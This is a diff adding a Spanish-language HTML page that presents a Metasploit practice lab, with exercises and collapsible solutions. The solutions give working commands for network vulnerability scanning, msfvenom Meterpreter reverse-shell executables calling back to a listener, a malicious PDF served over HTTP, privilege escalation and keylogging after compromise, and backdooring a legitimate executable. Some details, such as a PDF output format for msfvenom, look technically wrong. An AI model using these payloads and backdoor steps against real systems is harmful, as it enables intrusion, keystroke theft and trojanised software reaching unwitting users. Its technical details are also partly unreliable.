@@ -1,0 +1,105 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Metasploit: Laboratorio Práctico con Soluciones</title>
+  <style>
+    body { font-family: Arial, sans-serif; margin: 2rem; max-width: 800px; line-height: 1.6; }
+    h1, h2 { color: #2c3e50; }
+    pre { background: #ecf0f1; padding: 1rem; overflow-x: auto; }
+    code { font-family: "Courier New", monospace; }
+    .solution { background: #dff0d8; padding: 1rem; border-left: 4px solid #3c763d; }
+    details { margin-bottom: 1rem; }
+    details summary { cursor: pointer; font-weight: bold; }
+  </style>
+</head>
+<body>
+  <h1>Laboratorio Práctico de Metasploit</h1>
+  <p>Ejercicios para poner a prueba tus habilidades. Al final encontrarás las soluciones.</p>
+  <hr>
+
+  <h2>Ejercicio 1: Escaneo y Detección</h2>
+  <p>Usa <code>db_nmap</code> para:</p>
+  <ul>
+    <li>Escanear tu red local (<code>192.168.1.0/24</code>).</li>
+    <li>Identificar al menos 3 hosts activos.</li>
+    <li>Ejecutar un script de vulnerabilidad sobre uno de ellos.</li>
+  </ul>
+  
+  <h2>Ejercicio 2: Creación de Payloads</h2>
+  <p>Genera un ejecutable Meterpreter reverse TCP para Windows y configura un <code>multi/handler</code> para recibir la sesión.</p>
+
+  <h2>Ejercicio 3: PDF Malicioso</h2>
+  <p>Crea un documento PDF malicioso con <code>msfvenom -f pdf</code> y sirve el archivo en un servidor HTTP simple.</p>
+
+  <h2>Ejercicio 4: Post-explotación Básica</h2>
+  <p>Desde una sesión Meterpreter:</p>
+  <ul>
+    <li>Ejecuta <code>sysinfo</code> y guarda el resultado en un fichero.</li>
+    <li>Escala privilegios con el módulo <code>getsystem</code>.</li>
+    <li>Inicia un keylogger (<code>keylog_start</code>).</li>
+  </ul>
+
+  <h2>Ejercicio 5: Backdoor Avanzado</h2>
+  <p>Incrusta un payload en un ejecutable legítimo con <code>msfvenom -x original.exe</code> y verifica que sigue funcionando.</p>
+
+  <hr>
+  <h2>Soluciones</h2>
+
+  <details>
+    <summary>Solución Ejercicio 1</summary>
+    <div class="solution">
+      <pre><code>msf6 > db_nmap -sT -p 1-1024 192.168.1.0/24
+# hosts vivos almacenados en la DB
+en msfconsole:
+msf6 > hosts
+
+# Escaneo de vulnerabilidades:
+msf6 > db_nmap -sV --script vuln 192.168.1.50</code></pre>
+    </div>
+  </details>
+
+  <details>
+    <summary>Solución Ejercicio 2</summary>
+    <div class="solution">
+      <pre><code>msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.0.0.5 LPORT=4444 -f exe -o meterpreter.exe
+
+msf6 > use exploit/multi/handler
+msf6 exploit(multi/handler) > set payload windows/meterpreter/reverse_tcp
+msf6 exploit(...) > set LHOST 10.0.0.5
+msf6 exploit(...) > set LPORT 4444
+msf6 exploit(...) > run</code></pre>
+    </div>
+  </details>
+
+  <details>
+    <summary>Solución Ejercicio 3</summary>
+    <div class="solution">
+      <pre><code>msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.0.0.5 LPORT=4444 -f pdf -o exploit.pdf
+# Iniciar un servidor SimpleHTTP:
+python3 -m http.server 8080
+
+# Al descargar exploit.pdf y abrirlo, se conecta el handler.</code></pre>
+    </div>
+  </details>
+
+  <details>
+    <summary>Solución Ejercicio 4</summary>
+    <div class="solution">
+      <pre><code>meterpreter > sysinfo > salida.txt
+meterpreter > run post/windows/escalate/getsystem
+meterpreter > keylog_start</code></pre>
+    </div>
+  </details>
+
+  <details>
+    <summary>Solución Ejercicio 5</summary>
+    <div class="solution">
+      <pre><code>msfvenom -x original.exe -p windows/meterpreter/reverse_tcp LHOST=10.0.0.5 LPORT=4444 -k -f exe -o backdoor.exe
+# Ejecutar backdoor.exe mantiene la funcionalidad original y abre sesión Meterpreter.</code></pre>
+    </div>
+  </details>
+
+</body>
+</html>
